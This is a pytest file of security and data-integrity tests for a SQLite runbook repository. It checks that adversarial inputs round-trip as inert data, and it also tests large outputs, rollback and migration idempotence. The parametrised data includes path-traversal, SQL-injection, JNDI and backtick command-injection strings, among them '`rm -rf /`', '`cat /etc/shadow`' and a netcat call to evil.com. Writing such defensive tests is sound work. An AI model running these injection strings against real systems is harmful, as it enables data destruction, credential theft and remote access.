"""Security and data-integrity tests for runbook persistence (TASK-RSP-005).

Acceptance-criteria coverage map:

* AC-001: Adversarial identifiers/target/step_type round-trip byte-identical —
  :class:`TestAdversarialIdentifiersRoundTrip`.
* AC-002: Adversarial params (newline/tab/quote/nested mapping) reload
  identical — :class:`TestAdversarialParamsRoundTrip`.
* AC-003: 1,000,000-char captured_output reloads with same length and content —
  :class:`TestLargeCapturedOutputRoundTrip`.
* AC-004: Status update refused mid-write leaves prior committed status intact —
  :class:`TestStatusUpdateRollbackAtomicity`.
* AC-005: Re-applying migration to populated store leaves data unchanged —
  :class:`TestMigrationIdempotence`.
* AC-006: All tests use tmp_path writer-db fixture and pass —
  all test classes.
"""

from __future__ import annotations

import sqlite3
from datetime import UTC, datetime
from pathlib import Path
from typing import Iterator

import pytest

from forge.adapters.sqlite import connect as sqlite_connect
from forge.lifecycle import migrations as lifecycle_migrations
from forge.persistence.migrations import runbook as runbook_migration
from forge.persistence.repositories.runbook import RunbookRepository
from forge.persistence.repositories.runbook_models import (
    Runbook,
    Step,
    StepResult,
    StepStatus,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def writer_db(tmp_path: Path) -> Iterator[sqlite3.Connection]:
    """Return a writer connection against a freshly-migrated db file.

    Applies the existing forge schema migrations and then the runbook
    migration so tests run against the full production substrate.
    """
    db_path = tmp_path / "forge.db"
    cx = sqlite_connect.connect_writer(db_path)
    lifecycle_migrations.apply_at_boot(cx)
    runbook_migration.apply(cx)
    try:
        yield cx
    finally:
        cx.close()


@pytest.fixture()
def repository(writer_db: sqlite3.Connection) -> RunbookRepository:
    """Return a ``RunbookRepository`` bound to the migrated writer connection."""
    return RunbookRepository(connection=writer_db)


@pytest.fixture()
def fixed_now() -> datetime:
    return datetime(2026, 6, 21, 12, 0, 0, tzinfo=UTC)


def _make_runbook(
    *,
    runbook_id: str = "rb-001",
    target: str = "FEAT-TEST-001",
    steps: tuple[Step, ...] | None = None,
    current_step_index: int = 0,
    status: StepStatus = StepStatus.pending,
    created_at: datetime | None = None,
) -> Runbook:
    """Helper to build test Runbook instances."""
    now = created_at or datetime(2026, 6, 21, 12, 0, 0, tzinfo=UTC)
    if steps is None:
        steps = (
            Step(
                step_type="build",
                params={"target": "app"},
                status=StepStatus.pending,
                sequence_index=0,
            ),
        )
    return Runbook(
        runbook_id=runbook_id,
        target=target,
        steps=steps,
        current_step_index=current_step_index,
        status=status,
        created_at=now,
    )


# ---------------------------------------------------------------------------
# AC-001: Adversarial identifiers/target/step_type round-trip byte-identical
# ---------------------------------------------------------------------------


class TestAdversarialIdentifiersRoundTrip:
    """Adversarial identifiers/target/step_type round-trip verbatim through the store.

    Parameterised writes make them inert data, never executed or sanitised.
    Examples include path-traversal, SQL-injection-shaped, ${jndi}, null-byte,
    and backtick payloads.
    """

    @pytest.mark.parametrize(
        ("runbook_id", "target", "step_type"),
        [
            # Path traversal attempts
            ("../../../etc/passwd", "../../root", "../bin/sh"),
            # SQL injection shaped strings
            ("'; DROP TABLE runbooks; --", "' OR '1'='1", "admin'--"),
            # JNDI injection style
            ("${jndi:ldap://evil}", "${jndi:dns://bad}", "${env:SECRET}"),
            # Backtick command injection attempts
            ("`rm -rf /`", "`cat /etc/shadow`", "`nc evil.com 1234`"),
            # Unicode and special characters
            ("rb- -￿", "target-\U0001f4a9", "step-​-zero-width"),
            # Percent encoding attempts
            ("%2e%2e%2f", "%27OR%271%27%3D%271", "type%00null"),
        ],
    )
    def test_adversarial_strings_round_trip_byte_identical(
        self,
        repository: RunbookRepository,
        fixed_now: datetime,
        runbook_id: str,
        target: str,
        step_type: str,
    ) -> None:
        """Adversarial identifiers survive create→load unchanged."""
        step = Step(
            step_type=step_type,
            params={"key": "value"},
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(
            runbook_id=runbook_id,
            target=target,
            steps=(step,),
            created_at=fixed_now,
        )

        repository.create_runbook(runbook, correlation_id="corr-001")

        loaded = repository.load_runbook(runbook_id, correlation_id="corr-002")
        assert loaded is not None
        assert loaded.runbook_id == runbook_id
        assert loaded.target == target
        assert loaded.steps[0].step_type == step_type

    def test_null_byte_injection_round_trips(
        self, repository: RunbookRepository, fixed_now: datetime
    ) -> None:
        """Null byte injection attempts are stored as inert data."""
        # Construct null byte strings dynamically to avoid syntax errors
        null_runbook_id = f"rb-001{chr(0)}malicious"
        null_target = f"target{chr(0)}evil"
        null_step_type = f"type{chr(0)}bad"

        step = Step(
            step_type=null_step_type,
            params={"key": "value"},
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(
            runbook_id=null_runbook_id,
            target=null_target,
            steps=(step,),
            created_at=fixed_now,
        )

        repository.create_runbook(runbook, correlation_id="corr-001")

        loaded = repository.load_runbook(null_runbook_id, correlation_id="corr-002")
        assert loaded is not None
        assert loaded.runbook_id == null_runbook_id
        assert loaded.target == null_target
        assert loaded.steps[0].step_type == null_step_type


# ---------------------------------------------------------------------------
# AC-002: Adversarial params (newline/tab/quote/nested mapping) reload identical
# ---------------------------------------------------------------------------


class TestAdversarialParamsRoundTrip:
    """Adversarial params with special characters reload identical to stored values.

    Tests newline, tab, embedded quote, and nested mapping round-trip.
    """

    def test_params_with_newline_tab_quote_nested_mapping_round_trip(
        self, repository: RunbookRepository
    ) -> None:
        """Step params with special chars and nested structures round-trip."""
        adversarial_params = {
            "newline": "line1\nline2\nline3",
            "tab": "col1\tcol2\tcol3",
            "single_quote": "it's a test",
            "double_quote": 'he said "hello"',
            "both_quotes": """it's "complex" isn't it?""",
            "nested": {
                "inner": {"deep": "value\twith\ttabs"},
                "list": ["item\n1", "item\n2"],
            },
            "unicode": "emoji: \U0001f600, zero-width: ​",
            "backslash": "path\\to\\file",
            "json_chars": '{"key": "value"}',
        }

        step = Step(
            step_type="test",
            params=adversarial_params,
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(runbook_id="rb-params", steps=(step,))

        repository.create_runbook(runbook, correlation_id="corr-001")

        loaded = repository.load_runbook("rb-params", correlation_id="corr-002")
        assert loaded is not None
        assert loaded.steps[0].params == adversarial_params

    def test_params_with_sql_injection_payloads_round_trip(
        self, repository: RunbookRepository
    ) -> None:
        """SQL injection payloads in params are stored as inert data."""
        sql_injection_params = {
            "payload1": "'; DROP TABLE runbook_steps; --",
            "payload2": "' OR '1'='1",
            "payload3": "admin'--",
            "payload4": "1' UNION SELECT * FROM runbooks--",
            "payload5": "'; INSERT INTO runbooks VALUES('evil','bad',0,'pending','2026-01-01'); --",
        }

        step = Step(
            step_type="sql-test",
            params=sql_injection_params,
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(runbook_id="rb-sql-params", steps=(step,))

        repository.create_runbook(runbook, correlation_id="corr-001")

        loaded = repository.load_runbook("rb-sql-params", correlation_id="corr-002")
        assert loaded is not None
        assert loaded.steps[0].params == sql_injection_params


# ---------------------------------------------------------------------------
# AC-003: 1,000,000-char captured_output reloads with same length and content
# ---------------------------------------------------------------------------


class TestLargeCapturedOutputRoundTrip:
    """Large captured output survives persist-and-reload without truncation.

    A 1,000,000-character output must reload with identical length and
    content — no truncation that could hide activity.
    """

    def test_one_million_char_output_reloads_intact(
        self, repository: RunbookRepository, fixed_now: datetime
    ) -> None:
        """1,000,000-char captured_output survives persistence unchanged."""
        # Build a 1,000,000-character string with recognizable pattern
        # Use a repeating pattern so we can verify content integrity
        chunk = "0123456789" * 100  # 1,000 chars
        large_output = chunk * 1000  # 1,000,000 chars
        assert len(large_output) == 1_000_000

        step = Step(
            step_type="large-output",
            params={},
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(
            runbook_id="rb-large-output",
            steps=(step,),
            created_at=fixed_now,
        )
        repository.create_runbook(runbook, correlation_id="corr-001")

        # Update with large result
        result = StepResult(
            exit_code=0,
            captured_output=large_output,
            started_at=fixed_now,
            completed_at=datetime(2026, 6, 21, 12, 5, 0, tzinfo=UTC),
        )
        repository.update_step_status(
            "rb-large-output",
            0,
            StepStatus.passed,
            correlation_id="corr-002",
            result=result,
        )

        # Reload and verify
        loaded = repository.load_runbook("rb-large-output", correlation_id="corr-003")
        assert loaded is not None
        assert loaded.steps[0].result is not None
        assert len(loaded.steps[0].result.captured_output) == 1_000_000
        assert loaded.steps[0].result.captured_output == large_output
        # Verify pattern integrity at start, middle, and end
        assert loaded.steps[0].result.captured_output[:10] == "0123456789"
        assert loaded.steps[0].result.captured_output[500_000:500_010] == "0123456789"
        assert loaded.steps[0].result.captured_output[-10:] == "0123456789"


# ---------------------------------------------------------------------------
# AC-004: Status update refused mid-write leaves prior committed status intact
# ---------------------------------------------------------------------------


class TestStatusUpdateRollbackAtomicity:
    """A status update that fails mid-write leaves the prior committed status intact.

    Simulates store becoming unavailable during a write — the step should
    retain its previously committed status on reload.
    """

    def test_status_update_failure_preserves_prior_status(
        self, repository: RunbookRepository, tmp_path: Path, fixed_now: datetime
    ) -> None:
        """Failed status update rolls back, prior status remains on reload."""
        # Create a runbook with initial status
        step = Step(
            step_type="build",
            params={},
            status=StepStatus.pending,
            sequence_index=0,
        )
        runbook = _make_runbook(
            runbook_id="rb-rollback",
            steps=(step,),
            created_at=fixed_now,
        )
        repository.create_runbook(runbook, correlation_id="corr-001")

        # Update status to running (this should succeed)
        repository.update_step_status(
            "rb-rollback",
            0,
            StepStatus.running,
            correlation_id="corr-002",
        )

        # Verify it was committed
        loaded = repository.load_runbook("rb-rollback", correlation_id="corr-003")
        assert loaded is not None
        assert loaded.steps[0].status == StepStatus.running

        # Now simulate a failure during the next update by closing the connection
        # and creating a new repository with a closed connection
        db_path = tmp_path / "forge.db"
        closed_connection = sqlite_connect.connect_writer(db_path)
        closed_connection.close()
        broken_repo = RunbookRepository(connection=closed_connection)

        # Attempt to update status with the broken repository (should fail)
        try:
            broken_repo.update_step_status(
                "rb-rollback",
                0,
                StepStatus.passed,
                correlation_id="corr-004",
            )
        except sqlite3.ProgrammingError:
            # Expected — connection is closed
            pass

        # Reload with the original (working) repository and verify status is still "running"
        loaded_after = repository.load_runbook("rb-rollback", correlation_id="corr-005")
        assert loaded_after is not None
        assert loaded_after.steps[0].status == StepStatus.running


# ---------------------------------------------------------------------------
# AC-005: Re-applying migration to populated store leaves data unchanged
# ---------------------------------------------------------------------------


class TestMigrationIdempotence:
    """Re-running the migration against an already-migrated store changes nothing.

    The migration is idempotent — running it multiple times on the same
    database with existing data should not modify or lose any data.
    """

    def test_reapplying_migration_preserves_existing_data(
        self, writer_db: sqlite3.Connection, repository: RunbookRepository, fixed_now: datetime
    ) -> None:
        """Re-running runbook.apply() on populated store preserves all data."""
        # Create test data
        steps = (
            Step(
                step_type="build",
                params={"target": "app"},
                status=StepStatus.pending,
                sequence_index=0,
            ),
            Step(
                step_type="test",
                params={"suite": "unit"},
                status=StepStatus.running,
                sequence_index=1,
            ),
        )
        runbook = _make_runbook(
            runbook_id="rb-idempotent",
            target="FEAT-IDEMPOTENT",
            steps=steps,
            current_step_index=1,
            status=StepStatus.running,
            created_at=fixed_now,
        )
        repository.create_runbook(runbook, correlation_id="corr-001")

        # Load and verify initial state
        loaded_before = repository.load_runbook("rb-idempotent", correlation_id="corr-002")
        assert loaded_before is not None

        # Re-apply the migration (should be a no-op)
        runbook_migration.apply(writer_db)

        # Load again and verify data is unchanged
        loaded_after = repository.load_runbook("rb-idempotent", correlation_id="corr-003")
        assert loaded_after is not None
        assert loaded_after.runbook_id == loaded_before.runbook_id
        assert loaded_after.target == loaded_before.target
        assert loaded_after.current_step_index == loaded_before.current_step_index
        assert loaded_after.status == loaded_before.status
        assert loaded_after.created_at == loaded_before.created_at
        assert len(loaded_after.steps) == len(loaded_before.steps)
        for idx, (step_before, step_after) in enumerate(
            zip(loaded_before.steps, loaded_after.steps, strict=True)
        ):
            assert step_after.step_type == step_before.step_type
            assert step_after.params == step_before.params
            assert step_after.status == step_before.status
            assert step_after.sequence_index == step_before.sequence_index

        # Verify table structure is still intact
        runbooks_count = writer_db.execute("SELECT COUNT(*) FROM runbooks").fetchone()[0]
        steps_count = writer_db.execute("SELECT COUNT(*) FROM runbook_steps").fetchone()[0]
        assert runbooks_count == 1
        assert steps_count == 2

    def test_reapplying_migration_multiple_times_is_safe(
        self, writer_db: sqlite3.Connection, repository: RunbookRepository
    ) -> None:
        """Running migration 5 times consecutively is safe."""
        # Create initial data
        runbook = _make_runbook(runbook_id="rb-multi-apply")
        repository.create_runbook(runbook, correlation_id="corr-001")

        # Apply migration 5 more times
        for _ in range(5):
            runbook_migration.apply(writer_db)

        # Verify data still loads correctly
        loaded = repository.load_runbook("rb-multi-apply", correlation_id="corr-002")
        assert loaded is not None
        assert loaded.runbook_id == "rb-multi-apply"
